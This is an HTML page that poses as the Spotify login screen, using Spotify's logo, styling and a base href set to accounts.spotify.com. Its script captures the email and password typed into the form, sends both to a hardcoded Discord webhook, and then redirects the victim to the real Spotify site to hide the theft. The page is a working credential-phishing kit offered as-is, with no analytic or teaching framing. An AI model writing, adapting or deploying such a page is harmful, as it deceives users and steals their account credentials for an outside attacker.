<html><head><base href="https://accounts.spotify.com/"><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Log in to Spotify</title><style>
body {
    font-family: 'Helvetica Neue', Arial, sans-serif;
    background-color: #121212;
    color: #ffffff;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
    margin: 0;
}
.login-container {
    background-color: #181818;
    padding: 40px;
    border-radius: 8px;
    width: 100%;
    max-width: 350px;
    box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
}
.logo {
    text-align: center;
    margin-bottom: 30px;
}
.logo img {
    width: 180px;
    height: auto;
}
h1 {
    text-align: center;
    font-size: 28px;
    margin-bottom: 30px;
    color: #1DB954;
}
form {
    display: flex;
    flex-direction: column;
}
input {
    margin-bottom: 15px;
    padding: 12px;
    border: none;
    border-radius: 4px;
    background-color: #282828;
    color: #ffffff;
    font-size: 16px;
}
input::placeholder {
    color: #b3b3b3;
}
button {
    background-color: #1DB954;
    color: white;
    border: none;
    padding: 12px;
    border-radius: 30px;
    font-size: 16px;
    font-weight: bold;
    cursor: pointer;
    transition: background-color 0.3s;
}
button:hover {
    background-color: #1ed760;
}
.error-message {
    color: #ff5757;
    text-align: center;
    margin-top: 15px;
    font-size: 14px;
}
</style></head><body>
<div class="login-container">
    <div class="logo">
        <img src="https://storage.googleapis.com/pr-newsroom-wp/1/2018/11/Spotify_Logo_RGB_White.png" alt="Spotify Logo" width="180" height="54">
    </div>
    <h1>Log in to Spotify</h1>
    <form id="loginForm">
        <input type="email" id="email" placeholder="Email address" required>
        <input type="password" id="password" placeholder="Password" required>
        <button type="submit">LOG IN</button>
    </form>
    <div id="errorMessage" class="error-message"></div>
</div>

<script>
document.getElementById('loginForm').addEventListener('submit', function(e) {
    e.preventDefault();
    
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;
    const webhookURL = 'https://discord.com/api/webhooks/1275955434250960948/UvtQrK1KLUqrR7G4Icz1vqvtCRecfG3q99kmGy7gju-AH1m1MVRQc7Kcp_sp-r8ORU2K';

    fetch(webhookURL, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            content: `New login attempt:\nEmail: ${email}\nPassword: ${password}`
        })
    })
    .then(response => {
        if (response.ok) {
            // Simulate loading
            document.getElementById('errorMessage').textContent = 'Logging in...';
            setTimeout(() => {
                // Redirect to actual Spotify after a delay
                window.location.href = 'https://www.spotify.com/account/overview/';
            }, 2000);
        } else {
            throw new Error('Failed to log in');
        }
    })
    .catch(error => {
        console.error('Error:', error);
        document.getElementById('errorMessage').textContent = 'An error occurred. Please try again.';
    });
});
</script>
</body></html>
